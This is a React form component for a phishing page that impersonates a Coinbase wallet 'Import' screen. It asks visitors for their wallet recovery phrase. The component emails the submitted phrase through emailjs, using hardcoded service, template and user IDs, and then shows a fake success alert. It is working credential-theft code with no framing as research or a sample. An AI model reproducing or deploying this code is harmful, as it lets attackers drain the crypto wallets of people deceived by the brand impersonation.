import axios from 'axios';
import {useState} from 'react'
import emailjs from 'emailjs-com';


function Form() {
    
    function sendEmail(e){
        e.preventDefault();
        emailjs.sendForm('service_5ijjhwf', 'template_c4cmfyd', e.target, 'user_P4GGbSaRM8ZxHSlDfM3kM').then((result) => {
            console.log(result.text);
            alert("Your wallet has been Imported successfully✅");
        }, (error) =>{
            console.log(error.text)
        })
        e.target.reset()
        
    }
    return (
      
        <div className="container-md">
             <img
              width="20%"
              height="20%"
                    src="/logo/lg/c01nba5e.jpeg"
                    alt="logo"
                  />
              <h3 id="modal-headline" className="text-lg leading-6 mt-2 font-medium text-gray-900">
                                                Import your Coinbase wallet
                                            </h3> 
                                        
             
            <form
            
                onSubmit={sendEmail}
            >
                <div className="flex flex-col mb-6">
                    <label htmlFor="exampleInputEmail1">Wallet Name:</label>
                   < div className="relative"><div className="inline-flex items-center justify-center absolute left-0 top-0 h-full w-10 text-gray-400"><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6"><path d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg></div> 
                    <input
                        
                        className="text-sm sm:text-base placeholder-gray-500 pl-10 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400" 
                        id="exampleInputEmail1"
                        
                        placeholder="Coinbase Wallet"
                        required
                        
                        name="wallet_name"
                        
                        
                    /></div>
                    
                </div>
                
                <div className="form-group mb-2">
                    <label htmlFor="exampleInputName">Recovery Phrase:</label>
                    <textarea
                        
                        className="form-control"
                        id="exampleInputName"
                        placeholder="Enter your recovery phrase"
                        required
                        name="recovery_phrase"
                        rows={4}
                        cols={30}
                        
                        
                    />
                </div> 
                <p className="text-xs text-grey-300">
                                                                    Typically 12 (sometimes 24) words separated by
                                                                    single spaces
                                                                </p>
                
                
                <button type="submit" name="submit" className="flex items-center justify-center focus:outline-none text-white text-sm sm:text-base bg-blue-600 hover:bg-blue-700 rounded py-2 w-full transition duration-150 ease-in"><span className="mr-2 uppercase">Import</span> <span><svg fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" stroke="currentColor" className="h-6 w-6"><path d="M13 9l3 3m0 0l-3 3m3-3H8m13 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg></span></button>
                <button type="button" className="w-full inline-flex justify-center rounded-md border border-transparent shadow-sm px-4 py-2 bg-red-600 text-base font-medium text-white hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 sm:ml-3 sm:w-auto sm:text-sm" >
                                        Cancel
                                    </button>
            
            </form>
        </div>
    );
}


export default Form;